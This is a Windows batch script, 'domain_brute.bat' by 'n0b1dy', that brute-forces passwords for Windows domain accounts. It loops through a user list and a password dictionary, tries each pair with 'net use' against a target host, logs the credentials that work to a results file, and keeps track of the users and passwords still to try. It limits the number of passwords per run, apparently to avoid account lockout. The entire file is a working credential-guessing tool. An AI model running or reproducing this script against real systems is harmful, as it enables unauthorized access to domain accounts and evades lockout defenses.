@echo off
@REM domain_brute.bat IP DOMAIN results.txt NumberofPasstoTest Sizeofdictionary
@remember to take a copy of original pass.txt!!!!
@REM by n0b1dy

echo -------------------------------
if exist users.txt (echo [+]users.txt exists!) else (echo [*]Enumerate first valid users, example net users, net localgroup "Domain Admins".Store them as users.txt)
echo [*]Size of pass.txt file
find /c /v "" pass.txt
echo [*]BackUp original pass.txt
copy pass.txt pass.bak
if exist pass.orig (type pass.orig) else (echo [-]No pass.orig!Make Back Up!)
pause
echo -------------------------------
echo Windows Domain User Brute Force 
echo Domain: %2
echo Target: %1
echo Results: %3
echo Passwords to Test: %4
echo Size of Dictionary Given: %5
echo -------------------------------
set /a ACCOUNTLOCK="%5-%4"
echo [*]Attempt last %4 passwords from %5 size pass.txt
more pass.txt +%ACCOUNTLOCK% >pass_.txt
echo -------------------------------
echo [*]Start Bruteforcing
@for /f %%i in (users.txt) do @(for /f %%j in (pass_.txt) do @echo %%i:%%j & @net use \\%1 %%j /u:%2\%%i 2>nul && echo %%i:%%j >> %3 && net use \\%1 /del) 
cls
echo -------------------------------
echo [+]Passwords found for Domain %2:
find /c /v "" %3
echo -------------------------------
type %3
echo -------------------------------
echo [!]Last Passwords used from pass.txt:
type pass_.txt
echo [!]Remaining Users to be brute-forced:
@for /F "tokens=1 delims=:" %%m in (results.txt) do @echo %%m >> users.found
@findstr /V /G:users.found users.txt 

echo [!]Remaining Passwords to be used:
@findstr /V /G:pass_.txt pass.txt > pass.tmp
@copy pass.tmp pass.txt
find /c /v "" pass.txt
@del pass.tmp
type pass.txt
@net use * /del 


